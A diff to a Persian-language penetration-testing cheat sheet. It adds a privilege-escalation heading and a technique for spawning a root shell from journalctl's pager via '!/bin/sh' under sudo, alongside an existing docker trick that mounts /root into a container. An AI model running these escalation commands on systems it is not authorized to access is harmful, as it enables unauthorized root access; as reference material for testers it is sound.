@@ -289,6 +289,8 @@ exec "/bin/sh"
 
  [netsec.ws](http://netsec.ws/?p=337)
 
+## ارتقا دسترسی
+
 ### افزایش دسترسی با docker
 
 باید با کاربردی که عضو گروه docker است وارد شده باشید.
@@ -296,6 +298,23 @@ exec "/bin/sh"
 ```text
 docker run -v /root:/mnt -it ubuntu
 ```
+
+### افزایش دسترسی در journalctl 
+
+اجرا کننده journalctl باید با دسترسی بیشتری مانند sudo اجرا شده باشد.
+
+```text
+journalctl
+!/bin/sh
+```
+
+یا
+
+```text
+sudo journalctl
+!/bin/sh
+```
+
 
 ## دسترسی همیشگی
 
